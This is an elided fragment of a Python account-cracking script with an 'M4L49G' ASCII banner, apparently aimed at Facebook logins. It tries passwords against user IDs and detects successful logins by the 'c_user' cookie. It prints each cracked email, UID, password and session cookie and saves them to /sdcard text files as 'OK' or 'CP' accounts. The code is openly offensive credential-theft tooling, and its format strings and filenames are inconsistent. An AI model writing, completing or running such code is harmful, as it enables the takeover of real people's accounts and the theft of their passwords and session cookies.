...
888b     d888     d8888  888        d8888   .d8888b.   .d8888b.  

8888b   d8888    d8P888  888       d8P888  d88P  Y88b d88P  Y88b 

88888b.d88888   d8P 888  888      d8P 888  888    888 888    888 

888Y88888P888  d8P  888  888     d8P  888  Y88b. d888 888        

888 Y888P 888 d88   888  888    d88   888   "Y888P888 888  88888 

888  Y8P  888 8888888888 888    8888888888        888 888    888 

888   "   888       888  888          888  Y88b  d88P Y88b  d88P 

888       888       888  88888888     888   "Y8888P"   "Y8888P88 
...
def checks(oks,cps,twf):
    ...
    if len(cps) != 0:
        ...
        print('\n\n\x1b[1;34m TOTAL OK : \x1b[1;34m %s  \x1b[1;34mKB-OK.txt' % (

            H, P, str(len(oks))))

        print('\x1b[1;91m TOTAL CP :\x1b[1;91m   %s \x1b[1;91mKB-CP.txt' %
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[âˆš]---------------------[M4L49G-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')

                cek_apk(session,coki)

                open('/sdcard/M4L4NG-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r{Red}[Ã—]--------------------[M4L49G-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')

                open('/sdcard/M4L9G-CP.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[M4L49G] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
